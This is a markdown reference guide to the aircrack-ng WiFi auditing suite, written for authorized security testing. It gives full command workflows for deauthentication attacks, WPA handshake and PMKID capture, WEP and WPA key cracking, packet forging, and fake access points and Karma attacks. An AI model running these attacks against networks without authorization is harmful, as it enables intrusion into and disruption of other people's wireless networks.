# Aircrack-ng Suite Complete Guide

A comprehensive reference for WiFi security auditing tools. **For authorized penetration testing and educational purposes only.**

---

## Table of Contents

1. [Suite Overview](#suite-overview)
2. [Prerequisites](#prerequisites)
3. [Airmon-ng](#airmon-ng)
4. [Airodump-ng](#airodump-ng)
5. [Aireplay-ng](#aireplay-ng)
6. [Aircrack-ng](#aircrack-ng)
7. [Tool Interconnections](#tool-interconnections)
8. [Complete Workflows](#complete-workflows)

---

## Suite Overview

```
┌─────────────┐     ┌──────────────┐     ┌─────────────┐     ┌────────────┐
│  airmon-ng  │ --> │ airodump-ng  │ --> │ aireplay-ng │ --> │ aircrack-ng│
│  (monitor)  │     │  (capture)   │     │  (inject)   │     │  (crack)   │
└─────────────┘     └──────────────┘     └─────────────┘     └────────────┘
```

| Tool | Purpose |
|------|---------|
| `airmon-ng` | Enable/disable monitor mode on wireless interfaces |
| `airodump-ng` | Capture packets and discover networks |
| `aireplay-ng` | Inject packets and perform attacks |
| `aircrack-ng` | Crack WEP/WPA keys from captured data |
| `airdecap-ng` | Decrypt captured packets |
| `packetforge-ng` | Create encrypted packets for injection |
| `airbase-ng` | Create fake access points |

---

## Prerequisites

### Check Wireless Interface
```bash
# List wireless interfaces
iwconfig

# Alternative method
ip link show

# Check if interface supports monitor mode
iw list | grep -A 10 "Supported interface modes"
```

### Install Aircrack-ng
```bash
# Debian/Ubuntu
sudo apt update && sudo apt install aircrack-ng

# Arch Linux
sudo pacman -S aircrack-ng

# Fedora
sudo dnf install aircrack-ng
```

---

## Airmon-ng

**Purpose:** Manage monitor mode on wireless interfaces.

### Basic Commands

```bash
# Check interface status and kill interfering processes
sudo airmon-ng check kill

# Start monitor mode
sudo airmon-ng start wlan0

# Start monitor mode on specific channel
sudo airmon-ng start wlan0 6

# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Check running processes that may interfere
sudo airmon-ng check
```

### All Options

| Option | Description |
|--------|-------------|
| `start <interface>` | Enable monitor mode |
| `stop <interface>` | Disable monitor mode |
| `check` | List processes that may interfere |
| `check kill` | Kill interfering processes |
| `<interface> <channel>` | Set specific channel when starting |

### Output Example
```
PHY     Interface       Driver          Chipset
phy0    wlan0           ath9k_htc       Qualcomm Atheros AR9271

                (monitor mode enabled on wlan0mon)
```

---

## Airodump-ng

**Purpose:** Capture 802.11 packets and collect WEP IVs or WPA handshakes.

### Basic Commands

```bash
# Scan all networks on all channels
sudo airodump-ng wlan0mon

# Scan specific channel
sudo airodump-ng -c 6 wlan0mon

# Scan specific channel and BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Write capture to file
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Scan 5GHz band
sudo airodump-ng --band a wlan0mon

# Scan both 2.4GHz and 5GHz
sudo airodump-ng --band abg wlan0mon
```

### All Options

#### Filter Options
```bash
# Filter by BSSID (target AP MAC)
--bssid AA:BB:CC:DD:EE:FF

# Filter by ESSID (network name)
--essid "NetworkName"

# Filter by channel
-c <channel>
--channel <channel>

# Filter by encryption type
--encrypt WPA2
--encrypt WEP
--encrypt OPN
```

#### Output Options
```bash
# Write output prefix
-w <prefix>
--write <prefix>

# Output formats
--output-format pcap      # Packet capture
--output-format ivs       # IVs only (smaller)
--output-format csv       # CSV format
--output-format kismet    # Kismet format

# Write to specific formats
--write-interval <seconds>  # Save every N seconds

# GPS coordinates
--gpsd                    # Use GPS daemon
```

#### Display Options
```bash
# Update display every N seconds
--update 1

# Show station manufacturer
--manufacturer

# Show uptime
--uptime

# Show WPS information
--wps

# Berlin mode (only show APs with clients)
--berlin <seconds>
```

#### Band Selection
```bash
--band a      # 5 GHz
--band b      # 2.4 GHz
--band g      # 2.4 GHz
--band abg    # All bands
```

### Complete Options Table

| Option | Short | Description |
|--------|-------|-------------|
| `--bssid` | | Target AP MAC address |
| `--essid` | | Target network name |
| `--channel` | `-c` | Specific channel to monitor |
| `--band` | | Frequency band (a/b/g) |
| `--write` | `-w` | Output file prefix |
| `--output-format` | | Output format (pcap/ivs/csv/kismet) |
| `--update` | | Screen update interval |
| `--beacons` | | Record all beacons |
| `--showack` | | Show ACK/CTS/RTS |
| `--ivs` | | Save only IVs (WEP) |
| `--gpsd` | | Use GPS coordinates |
| `--manufacturer` | | Show manufacturer |
| `--uptime` | | Show AP uptime |
| `--wps` | | Show WPS status |
| `--ignore-negative-one` | | Ignore channel -1 errors |
| `--write-interval` | | Auto-save interval |
| `--berlin` | | Only show active APs |

### Output Columns Explained

**Top Section (Access Points):**
```
BSSID              PWR  Beacons  #Data  #/s  CH   MB   ENC   CIPHER AUTH ESSID
AA:BB:CC:DD:EE:FF  -45  100      500    10   6    54e  WPA2  CCMP   PSK  MyNetwork
```

| Column | Meaning |
|--------|---------|
| BSSID | AP MAC address |
| PWR | Signal strength (higher = stronger) |
| Beacons | Number of beacon frames |
| #Data | Number of data packets |
| #/s | Data packets per second |
| CH | Channel |
| MB | Speed (e = 802.11n) |
| ENC | Encryption (WEP/WPA/WPA2/OPN) |
| CIPHER | Cipher (CCMP/TKIP/WEP) |
| AUTH | Authentication (PSK/MGT/SKA/OPN) |
| ESSID | Network name |

**Bottom Section (Clients):**
```
BSSID              STATION            PWR   Rate    Lost    Frames  Probe
AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -50   54e-54  0       100
```

| Column | Meaning |
|--------|---------|
| BSSID | Associated AP |
| STATION | Client MAC |
| PWR | Client signal strength |
| Rate | Transmit-Receive rate |
| Lost | Lost packets |
| Frames | Captured frames |
| Probe | Probed networks |

---

## Aireplay-ng

**Purpose:** Generate traffic for packet injection and various attacks.

### Attack Modes

| Number | Attack Name | Description |
|--------|-------------|-------------|
| 0 | Deauthentication | Disconnect clients from AP |
| 1 | Fake Authentication | Associate with AP (WEP) |
| 2 | Interactive Packet Replay | Choose packet to replay |
| 3 | ARP Request Replay | Classic WEP attack |
| 4 | KoreK Chopchop | Decrypt WEP without key |
| 5 | Fragmentation | Obtain keystream |
| 6 | Cafe-latte | Attack client directly |
| 7 | Client-oriented Fragmentation | Attack client |
| 8 | WPA Migration Mode | |
| 9 | Injection Test | Test injection capability |

### Deauthentication Attack (Attack 0)

```bash
# Deauth all clients from AP (0 = continuous)
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Deauth specific client
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Send 10 deauth packets
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Deauth on specific channel
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 --ignore-negative-one wlan0mon
```

| Option | Description |
|--------|-------------|
| `-0 <count>` | Number of deauths (0 = infinite) |
| `-a <bssid>` | Target AP MAC |
| `-c <client>` | Target client MAC |
| `-D` | Disable AP detection |

### Fake Authentication (Attack 1)

```bash
# Basic fake auth
sudo aireplay-ng -1 0 -e "NetworkName" -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# Fake auth with keep-alive
sudo aireplay-ng -1 6000 -o 1 -q 10 -e "NetworkName" -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# Shared key fake auth (requires keystream)
sudo aireplay-ng -1 0 -e "NetworkName" -y keystream.xor -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
```

| Option | Description |
|--------|-------------|
| `-1 <delay>` | Reassociation delay |
| `-e <essid>` | Network name |
| `-a <bssid>` | Target AP |
| `-h <source>` | Source MAC (your adapter) |
| `-o <count>` | Packets per burst |
| `-q <seconds>` | Keep-alive interval |
| `-y <file>` | Keystream file |

### ARP Request Replay (Attack 3)

```bash
# Basic ARP replay
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# With specific options
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 -x 1000 wlan0mon
```

| Option | Description |
|--------|-------------|
| `-3` | ARP replay mode |
| `-b <bssid>` | Target AP |
| `-h <source>` | Source MAC |
| `-x <pps>` | Packets per second |
| `-r <file>` | Read from pcap file |

### Fragmentation Attack (Attack 5)

```bash
# Basic fragmentation
sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# With capture file
sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 -r capture.cap wlan0mon
```

### Chopchop Attack (Attack 4)

```bash
# Basic chopchop
sudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
```

### Injection Test (Attack 9)

```bash
# Test injection capability
sudo aireplay-ng -9 wlan0mon

# Test against specific AP
sudo aireplay-ng -9 -e "NetworkName" -a AA:BB:CC:DD:EE:FF wlan0mon

# Test card-to-card injection
sudo aireplay-ng -9 -i wlan1mon wlan0mon
```

### All Common Options

| Option | Description |
|--------|-------------|
| `-a <bssid>` | AP MAC address |
| `-c <client>` | Client MAC address |
| `-h <mac>` | Source MAC (your card) |
| `-e <essid>` | Network name |
| `-x <pps>` | Packets per second |
| `-p <fctrl>` | Frame control word |
| `-D` | Disable AP detection |
| `-F` | Choose first matching packet |
| `-B` | Bit rate test |
| `-r <file>` | Read packets from file |

---

## Aircrack-ng

**Purpose:** Crack WEP and WPA/WPA2-PSK keys from captured data.

### Basic Commands

```bash
# Crack WPA with wordlist
aircrack-ng -w wordlist.txt capture-01.cap

# Crack WPA with specific BSSID
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# Crack WEP (needs enough IVs)
aircrack-ng capture-01.cap

# Crack WEP with PTW attack
aircrack-ng -z capture-01.cap

# Crack with multiple wordlists
aircrack-ng -w wordlist1.txt,wordlist2.txt,wordlist3.txt capture-01.cap

# Use all CPU cores
aircrack-ng -w wordlist.txt -p 4 capture-01.cap
```

### All Options

#### Input Options
```bash
# Specify capture file(s)
aircrack-ng capture-01.cap capture-02.cap

# Merge multiple files
aircrack-ng *.cap

# Read from stdin
aircrack-ng -w - capture.cap
```

#### Target Selection
```bash
# Target specific BSSID
-b AA:BB:CC:DD:EE:FF
--bssid AA:BB:CC:DD:EE:FF

# Target specific ESSID
-e "NetworkName"
--essid "NetworkName"
```

#### Wordlist Options
```bash
# Specify wordlist
-w wordlist.txt
--words wordlist.txt

# Multiple wordlists
-w list1.txt,list2.txt

# Read from stdin (pipe from crunch, etc.)
-w -
```

#### WPA Options
```bash
# Use PMKID attack
-I

# Set ESSID for PMKID
-e "NetworkName"
```

#### WEP Options
```bash
# PTW attack (faster, needs ARP packets)
-z
--ptw

# Korek attack
-K

# Set key length (64 or 128)
-n 64
-n 128

# Starting character for bruteforce
-c <char>

# Use only specified bytes
-t

# Bruteforce mode
-x
-x1  # Last keybyte
-x2  # Last two keybytes
```

#### Performance Options
```bash
# Number of CPU cores
-p <threads>
--cpu-detect

# Quiet mode
-q

# Show key as ASCII
-s

# Show all keys found
-a
```

#### Output Options
```bash
# Write key to file
-l keyfile.txt

# JSON output
-j output.json
```

### Complete Options Table

| Option | Short | Description |
|--------|-------|-------------|
| `--bssid` | `-b` | Target BSSID |
| `--essid` | `-e` | Target ESSID |
| `--words` | `-w` | Wordlist file |
| `--ptw` | `-z` | PTW WEP attack |
| `-K` | | Korek WEP attack |
| `-n` | | WEP key length |
| `-p` | | CPU threads |
| `-q` | | Quiet mode |
| `-s` | | Show ASCII key |
| `-l` | | Output key file |
| `-I` | | PMKID attack |
| `-j` | | JSON output |
| `-x` | | Bruteforce mode |
| `-X` | | Disable bruteforce |
| `-y` | | Experimental attack |

---

## Tool Interconnections

### Data Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                        WORKFLOW DIAGRAM                          │
└─────────────────────────────────────────────────────────────────┘

1. SETUP
   airmon-ng start wlan0
         │
         ▼
   Creates: wlan0mon (monitor interface)

2. RECONNAISSANCE
   airodump-ng wlan0mon
         │
         ▼
   Output: Networks list, channels, BSSIDs, clients

3. TARGET CAPTURE
   airodump-ng -c 6 --bssid XX:XX -w capture wlan0mon
         │
         ├──────────────────────┐
         ▼                      ▼
   Creates: capture-01.cap    Waits for: handshake/IVs

4. ACCELERATION (Optional)
   aireplay-ng -0 5 -a XX:XX -c YY:YY wlan0mon
         │
         ▼
   Forces: Client reconnection → Handshake capture

5. CRACKING
   aircrack-ng -w wordlist.txt capture-01.cap
         │
         ▼
   Output: Cracked password
```

### File Dependencies

| Tool | Input Files | Output Files |
|------|-------------|--------------|
| `airmon-ng` | None | Creates monitor interface |
| `airodump-ng` | None | `.cap`, `.csv`, `.kismet`, `.ivs` |
| `aireplay-ng` | `.cap` (optional) | `.xor` (keystream) |
| `aircrack-ng` | `.cap`, `.ivs` | Key (stdout/file) |
| `airdecap-ng` | `.cap` + key | Decrypted `.cap` |
| `packetforge-ng` | `.xor` | Forged packets |

---

## Complete Workflows

### Workflow 1: WPA/WPA2 Handshake Capture and Crack

```bash
# Step 1: Kill interfering processes
sudo airmon-ng check kill

# Step 2: Start monitor mode
sudo airmon-ng start wlan0

# Step 3: Scan for networks
sudo airodump-ng wlan0mon

# Step 4: Target specific network and capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon

# Step 5: (New terminal) Deauth client to force handshake
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Step 6: Wait for "WPA handshake: AA:BB:CC:DD:EE:FF" in airodump

# Step 7: Crack with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF wpa_capture-01.cap

# Step 8: Stop monitor mode
sudo airmon-ng stop wlan0mon

# Step 9: Restart network manager
sudo systemctl start NetworkManager
```

### Workflow 2: WEP Cracking (ARP Replay)

```bash
# Step 1: Setup
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: Find target
sudo airodump-ng wlan0mon

# Step 3: Capture IVs
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture --ivs wlan0mon

# Step 4: (Terminal 2) Fake authentication
sudo aireplay-ng -1 0 -e "NetworkName" -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# Step 5: (Terminal 3) ARP replay attack
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# Step 6: Wait for ~20,000+ IVs (check airodump #Data column)

# Step 7: Crack
aircrack-ng wep_capture-01.ivs

# Cleanup
sudo airmon-ng stop wlan0mon
```

### Workflow 3: WEP Cracking (Fragmentation)

```bash
# Steps 1-3: Same as above

# Step 4: Fake auth
sudo aireplay-ng -1 0 -e "NetworkName" -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# Step 5: Fragmentation attack (obtain keystream)
sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
# Save as fragment-XXXX.xor when prompted

# Step 6: Forge ARP packet
packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 -k 255.255.255.255 -l 255.255.255.255 -y fragment-XXXX.xor -w arp-request

# Step 7: Inject forged packet
sudo aireplay-ng -2 -r arp-request wlan0mon

# Step 8: Crack when enough IVs collected
aircrack-ng wep_capture-01.cap
```

### Workflow 4: PMKID Attack (Clientless WPA)

```bash
# Step 1: Setup
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: Capture PMKID (using hcxdumptool - separate tool)
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Alternative: Use airodump and wait for PMKID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w pmkid_capture wlan0mon

# Step 3: Convert for aircrack (if needed)
hcxpcapngtool -o hash.hc22000 capture.pcapng

# Step 4: Crack PMKID
aircrack-ng -w wordlist.txt -I pmkid_capture-01.cap
```

### Workflow 5: Hidden SSID Discovery

```bash
# Step 1: Setup monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: Find hidden network (shows as <length: X>)
sudo airodump-ng wlan0mon

# Step 3: Target the hidden network
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Step 4: Deauth a client to capture probe response
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# ESSID will appear in airodump when client reconnects
```

### Workflow 6: Multiple Wordlist Attack

```bash
# Using multiple wordlists
aircrack-ng -w wordlist1.txt,wordlist2.txt,wordlist3.txt capture-01.cap

# Using crunch for dynamic wordlist generation
crunch 8 8 0123456789 | aircrack-ng -w - -b AA:BB:CC:DD:EE:FF capture-01.cap

# Using John the Ripper rules
john --wordlist=wordlist.txt --rules --stdout | aircrack-ng -w - capture-01.cap
```

---

## Quick Reference Cards

### Essential Commands Cheat Sheet

```bash
# ===== SETUP =====
sudo airmon-ng check kill          # Kill interfering processes
sudo airmon-ng start wlan0         # Start monitor mode
sudo airmon-ng stop wlan0mon       # Stop monitor mode

# ===== SCANNING =====
sudo airodump-ng wlan0mon                                    # Scan all
sudo airodump-ng -c 6 wlan0mon                               # Scan channel 6
sudo airodump-ng --band a wlan0mon                           # Scan 5GHz

# ===== TARGETING =====
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon

# ===== ATTACKS =====
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon          # Deauth all
sudo aireplay-ng -0 5 -a [AP] -c [CLIENT] wlan0mon           # Deauth one
sudo aireplay-ng -3 -b [AP] -h [YOUR-MAC] wlan0mon           # ARP replay
sudo aireplay-ng -1 0 -e [ESSID] -a [AP] -h [MAC] wlan0mon   # Fake auth

# ===== CRACKING =====
aircrack-ng -w wordlist.txt capture-01.cap                   # WPA
aircrack-ng capture-01.ivs                                    # WEP
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF cap.cap     # Specific
```

### MAC Address Placeholders

| Placeholder | Meaning |
|-------------|---------|
| `AA:BB:CC:DD:EE:FF` | Target Access Point BSSID |
| `11:22:33:44:55:66` | Your wireless adapter MAC or Target client |
| `XX:XX:XX:XX:XX:XX` | Generic MAC address |

### Common Issues and Solutions

| Issue | Solution |
|-------|----------|
| "No such BSSID" | Verify you're on correct channel |
| "No interface" | Run `airmon-ng start wlan0` |
| Injection not working | Run `aireplay-ng -9` to test |
| Channel hopping | Use `-c <channel>` to lock |
| "Fixed channel" error | Use `--ignore-negative-one` |
| NetworkManager interference | Run `airmon-ng check kill` |

---

## Additional Tools Reference

### Airdecap-ng (Decrypt Captures)

```bash
# Decrypt WPA capture
airdecap-ng -p 'password' -e 'NetworkName' capture-01.cap

# Decrypt WEP capture
airdecap-ng -w HEXKEY capture-01.cap

# Output: capture-01-dec.cap
```

### Packetforge-ng (Create Packets)

```bash
# Create ARP request
packetforge-ng -0 -a [AP] -h [SRC] -k 255.255.255.255 -l 255.255.255.255 -y keystream.xor -w arp-packet
```

### Airbase-ng (Fake AP)

```bash
# Create fake AP
sudo airbase-ng -e "FakeNetwork" -c 6 wlan0mon

# Karma attack (respond to all probes)
sudo airbase-ng -P -C 30 -e "FakeNetwork" -c 6 wlan0mon
```

---

## Legal Disclaimer

**This guide is for authorized security testing and educational purposes only.**

- Only test networks you own or have explicit written permission to test
- Unauthorized access to computer networks is illegal
- Always comply with local laws and regulations
- Document all testing activities and obtain proper authorization

---

## Resources

- Official Documentation: https://www.aircrack-ng.org/documentation.html
- Wiki: https://www.aircrack-ng.org/doku.php
- Forum: https://forum.aircrack-ng.org/
